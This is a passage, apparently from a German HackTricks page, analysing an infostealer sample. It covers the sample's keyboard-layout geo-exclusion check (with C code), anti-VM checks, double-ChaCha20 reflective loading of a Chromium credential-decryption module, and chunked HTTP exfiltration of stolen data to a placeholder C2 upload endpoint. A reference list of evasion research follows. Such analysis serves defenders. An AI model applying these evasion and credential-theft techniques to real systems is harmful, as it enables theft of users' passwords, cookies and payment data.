- Ein Konfigurations-Flag (`anti_cis`) ermittelt mit `GetKeyboardLayoutList` die installierten Tastaturlayouts. Wird ein kyrillisches Layout gefunden, legt das Sample einen leeren `CIS`-Marker an und beendet sich, bevor es Stealer ausführt. So wird sichergestellt, dass es sich in ausgeschlossenen Regionen nicht aktiviert, während gleichzeitig ein Artefakt für die Suche zurückbleibt.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mehrschichtige `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollierenden Prüfsumme und vergleicht ihn mit eingebetteten Blocklisten für Debugger/Sandboxes; anschließend berechnet sie die Prüfsumme erneut für den Computernamen und überprüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl von Prozessen, kurze Betriebszeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen rund um Wartezeiten durch, um Einzelschritte zu erkennen. Bei jedem Treffer wird abgebrochen, bevor Module gestartet werden.

### Fileless-Helper + doppeltes ChaCha20-Reflective-Loading

- Die primäre DLL/EXE enthält einen Chromium-Credential-Helper, der entweder auf die Festplatte geschrieben oder manuell in den Speicher gemappt wird; im Fileless-Modus löst er Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine Second-Stage-DLL, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflectiv (ohne `LoadLibrary`) und ruft die Exporte `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) abgeleitet sind.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden Reflective Process Hollowing mit direkten Syscalls, um in einen laufenden Chromium-Browser zu injizieren, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkartendaten trotz ABE-Härtung direkt aus SQLite-Datenbanken zu entschlüsseln.

### Modulare In-Memory-Erfassung & HTTP-Exfiltration in Chunks

- `create_memory_based_log` durchläuft eine globale Funktionzeigertabelle namens `memory_generators` und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt Ergebnisse in gemeinsam genutzte Puffer und meldet nach einer Join-Wartezeit von etwa 45 Sekunden die Anzahl seiner Dateien.
- Anschließend wird alles mit der statisch gelinkten Bibliothek `miniz` als `%TEMP%\\Log.zip` gepackt. `ThreadPayload1` wartet dann 15 Sekunden und überträgt das Archiv in 10-MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei eine `multipart/form-data`-Boundary eines Browsers vorgetäuscht wird (`----WebKitFormBoundary***`). Jeder Chunk enthält `User-Agent: upload`, `auth: <build_id>` und optional `w: <campaign_tag>`; beim letzten Chunk wird `complete: true` angehängt, damit der C2 weiß, dass die Zusammensetzung abgeschlossen ist.

## References

- [1] [Advanced Evasion Tradecraft: Präzises Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call Stacks: keine Freifahrtscheine mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC für Call-Stack-Spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Neue Infektionskette und ConfuserEx-basierte Verschleierung für DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sollte man seinem Zero Trust vertrauen? Umgehung der Zscaler-Posture-Prüfungen](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Vor ToolShell: Einblicke in die früheren Ransomware-Operationen von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exporte](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar weitergeleiteter Exporte in Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Suchreihenfolge für Dynamic-Link Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prozesssicherheit und Zugriffsrechte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – EDRs mit Unterstützung von Protected Process Light (PPL) bekämpfen](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Die Schutzschicht von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenz zum Befehl mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Unter dem reinen Vorhang: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ambitionierter Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Entschlüsselung der Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-Malware mit API-Tracing abwehren](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Adaptix mit Crystal Palace in den Schlaf versetzen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET und Stack-Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-Sleep-Obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Dotnet ETW verbergen](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Chrome Remote Desktop bei Red-Team-Operationen missbrauchen: Ein praktischer Leitfaden](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Den Remediation-Treiber von Defender als Kernel-Operationsprimitive einsetzen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Begleitcode zu MDSecs Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: Selbstmaskierende Funktionen mit LLVM erstellen](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – Quellcode von InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – CreatePipe-Funktion](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Einen untergeordneten Prozess mit umgeleiteter Ein- und Ausgabe erstellen](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy: C#-Tools mit WasmForge neu schmieden](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – C#-/.NET-Projekte kompilieren](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty-Proof-of-Concept und Quellcode](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Interna des Thread-Pools für shellcodelose DLL-Injection missbrauchen](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024-Benchmark-Datensatz und thrember-Tools](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [EMBER2024 zur Bewertung von Red-Team-Implants verwenden](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – ML-basierte Erkennungen umgehen](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – .NET-Ladeframework auf Basis von NetamLoader XAML](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT-Enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan-Methode](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
